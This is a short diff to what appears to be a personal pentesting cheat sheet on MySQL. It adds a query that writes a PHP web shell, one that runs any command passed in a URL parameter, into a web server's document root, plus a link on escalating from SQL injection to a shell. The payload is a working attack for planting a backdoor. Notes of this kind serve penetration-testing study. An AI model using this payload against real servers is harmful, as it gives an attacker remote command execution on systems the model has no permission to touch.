@@ -8,6 +8,10 @@ root : ''
 
 #Enumeration Commands (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
 
+#Insert php shell.
+SELECT '<?php exec($_GET[''cmd'']); ?>' FROM mytable INTO dumpfile ‘/var/www/html/shell.php’
+
+#More tricks to priv esc or get shell.
 https://security.stackexchange.com/questions/6919/leveraging-a-shell-from-sql-injection
 ```
 
